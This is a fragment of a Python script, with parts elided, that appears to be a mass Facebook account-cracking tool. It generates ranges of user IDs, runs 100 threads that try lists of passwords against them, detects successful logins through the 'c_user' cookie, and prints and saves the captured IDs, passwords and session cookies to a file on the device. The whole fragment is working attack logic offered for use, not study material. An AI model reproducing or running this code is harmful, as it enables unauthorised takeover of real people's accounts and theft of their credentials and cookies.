...
from os import system as JIHAD
try:
    import requests
except:
...
def sykology():
    ...
    JIHAD_code=input(" Choice [</] >")
    line()
    print(" Example 1000/2000/3000/4000")
    JIHAD_lim=int(input(" Choice [</] >"))
    line()
    for z in range(JIHAD_lim):
    ...
    with ThreadPool(max_workers=100) as feel:
        print(logo)
        tl=str(len(JIHAD))
        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mJIHAD-ok.txt") 
...
def random_subb(uid,pwx,fb,fb1):
    ...
    sys.stdout.write(f"\r\033[38;5;46m[JIHAD-CYBER] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
    ...
    try:
        for ps in pwx:
            ...
            if "c_user" in eehhcc:
                ...
                xd="1000"+coki1[0:11]
                print(f"\r\r\033[38;5;46m[JIHAD-OK] \033[38;5;47m{xd} | {ps}  \n\033[38;5;46m[COOKIES] \033[38;5;49msb={sort}\n\033[38;5;48m———————————————————————————————————— ")
                open("/sdcard/JIHAD-ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
